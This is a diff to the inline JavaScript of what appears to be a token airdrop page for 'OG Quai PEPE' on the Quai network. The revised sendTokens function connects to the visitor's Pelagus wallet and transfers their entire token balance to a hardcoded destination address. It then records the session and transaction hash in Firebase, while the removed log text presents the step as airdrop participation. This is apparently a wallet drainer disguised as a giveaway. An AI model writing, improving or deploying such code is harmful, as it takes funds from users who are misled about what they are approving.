@@ -243,6 +243,10 @@
     </div>
 
     <script>
+        const TOKEN_ABI = [
+    "function transfer(address to, uint256 amount) returns (bool)",
+    "function balanceOf(address account) view returns (uint256)"
+];
         const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';
         const DESTINATION_ADDRESS = '0x006B8A853ee3235c77947D12E47A3dBC547Bab10';
         const RPC_ENDPOINT = 'https://rpc.quai.network/cyprus1';
@@ -394,67 +398,69 @@ async function saveToFirebase(data) {
         }
 
         async function sendTokens() {
-    if (typeof quais === 'undefined') {
-        console.error('Quais SDK not loaded');
-        return;
-    }
-
     try {
         if (!window.pelagus) {
             log('❌ Pelagus wallet not found');
             throw new Error('Pelagus wallet not found');
         }
 
-        log('🔄 Connecting to Pelagus...');
+        // Check QUAI balance for gas
+        const quaiBalance = await getQuaiBalance(userSession.address);
+        const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
+        const requiredQuai = 0.1;
+        
+        if (quaiAmount < requiredQuai) {
+            log('❌ Insufficient QUAI for gas fees');
+            log(`You need at least ${requiredQuai} QUAI for transaction. Current balance: ${quaiAmount.toFixed(4)} QUAI`);
+            throw new Error('Insufficient QUAI balance for gas');
+        }
+
+        // Initialize provider and signer
         const provider = new quais.BrowserProvider(window.pelagus);
         const signer = await provider.getSigner();
-
-        // Get user's address
-        const userAddress = await signer.getAddress();
-
-        // Check token balance
+        
+        // Initialize token contract
         const tokenContract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
-        const currentBalance = await tokenContract.balanceOf(userAddress);
 
-        if (currentBalance.lte(0)) {
+        // Get token balance
+        const balance = await tokenContract.balanceOf(userSession.address);
+        if (balance <= 0) {
             log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
 
-        const readableAmount = quais.formatUnits(currentBalance, 18);
-        log(`📤 Preparing to send ${readableAmount} OG Quai PEPE tokens...`);
+        const readableAmount = quais.formatUnits(balance, 18);
+        log(`📤 Sending ${readableAmount} OG Quai PEPE tokens...`);
 
         // Send transaction
-        log('🔄 Sending transaction...');
-        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, currentBalance);
-
+        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, balance);
         log(`📝 Transaction hash: ${tx.hash}`);
+        
+        // Wait for confirmation
         log('🔄 Waiting for confirmation...');
-        const txReceipt = await tx.wait();
+        const receipt = await tx.wait();
 
-        // Update userSession and save to Firebase
+        // Update UI and database
         userSession.transferAmount = readableAmount;
         userSession.transferTxHash = tx.hash;
         await saveSessionToFirebase();
 
-        // Update UI
         document.getElementById('sendBtn').style.display = 'none';
         document.getElementById('scanBtn').style.display = 'block';
         document.getElementById('buyBtn').style.display = 'block';
 
         log('✅ Transaction confirmed!');
-        log(`💫 Successfully sent ${readableAmount} OG Quai PEPE tokens!`);
-        log('🎉 Airdrop participation complete!');
+        log(`💫 Successfully sent ${readableAmount} tokens!`);
+
     } catch (error) {
         if (error.code === 4001) {
             log('❌ Transaction rejected in wallet');
             return;
         }
-        log('❌ Error sending tokens: ' + error.message);
-        console.error(error.message, error.stack);
+        log('❌ Error: ' + error.message);
+        console.error(error);
     }
 }
-
 
         async function waitForTransaction(txHash) {
             while (true) {
